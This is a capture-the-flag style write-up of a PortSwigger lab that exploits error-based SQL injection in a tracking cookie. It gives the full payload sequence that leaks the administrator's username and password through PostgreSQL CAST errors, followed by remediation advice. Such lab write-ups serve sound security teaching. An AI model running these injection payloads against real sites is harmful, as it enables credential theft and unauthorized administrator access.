# Error-Based SQL Injection via Tracking Cookie

## Platform
PortSwigger Web Security Academy

## Category
SQL Injection (Error-Based SQLi)

## Lab Goal
- Leak administrator password
- Log in as administrator

---

# Vulnerability Description

The application was vulnerable to Error-Based SQL Injection through the tracking cookie parameter.

User-controlled input was directly inserted into a SQL query without proper sanitization or parameterization. The application also exposed verbose database error messages, which allowed sensitive data extraction through crafted SQL payloads.

---

# Initial Analysis

Testing the tracking cookie with a single quote:

```sql
'
```

Result:
- HTTP 500 Internal Server Error

Database error:

```text
Unterminated string literal started at position...
```

This indicated that user input was being processed directly inside a SQL query.

---

# Confirming SQL Injection

Payload:

```sql
''
```

Result:
- HTTP 200 OK

Payload:

```sql
'--
```

Result:
- HTTP 200 OK
- Remaining SQL query successfully commented out

---

# Query Manipulation Testing

Payload:

```sql
' AND CAST((SELECT 1) AS int)--
```

Result:

```text
argument of AND must be type boolean, not type integer
```

Modified payload:

```sql
' AND 1=CAST((SELECT 1) AS int)--
```

Result:
- HTTP 200 OK

This confirmed successful SQL query manipulation.

---

# Extracting Database Information

## Checking for Existing Usernames

Payload:

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Database response:

```text
invalid input syntax for type integer: "administrator"
```

This confirmed that the username `administrator` existed in the database.

---

# Extracting Administrator Password

Payload:

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Database response leaked the administrator password:

```text
invalid input syntax for type integer: "jl2tcfk8xeteddrv8949"
```

The leaked credentials were then used to successfully log in as the administrator account.

---

# Impact

An attacker could exploit this vulnerability to:

- Leak sensitive database information
- Extract usernames and passwords
- Bypass authentication mechanisms
- Gain unauthorized administrator access
- Fully compromise the application

---

# Root Cause

The application directly concatenated user-controlled cookie values into SQL queries without proper parameterization.

Additionally, verbose database error messages exposed internal query behavior and database information, enabling attackers to exploit Error-Based SQL Injection.

---

# Recommended Fixes

## 1. Use Parameterized Queries
Prepared statements should be used for all database interactions.

## 2. Validate and Sanitize Input
Validate all user-controlled input before processing.

## 3. Disable Verbose Error Messages
Do not expose database errors or query details to end users.

## 4. Principle of Least Privilege
Restrict database permissions to the minimum required level.

## 5. Use ORM / Safe Query Builders
ORM frameworks help reduce risks caused by unsafe query construction.

---

# Tools Used

- Burp Suite (Repeater, Intercept)
- Browser
- Ubuntu Linux

---

# Key Takeaways

- Detailed database error messages significantly increase SQL injection impact.
- Error-Based SQL Injection can lead to direct credential disclosure.
- Proper parameterization is critical for preventing SQL injection vulnerabilities.
- Even non-visible inputs such as tracking cookies can become dangerous attack vectors.
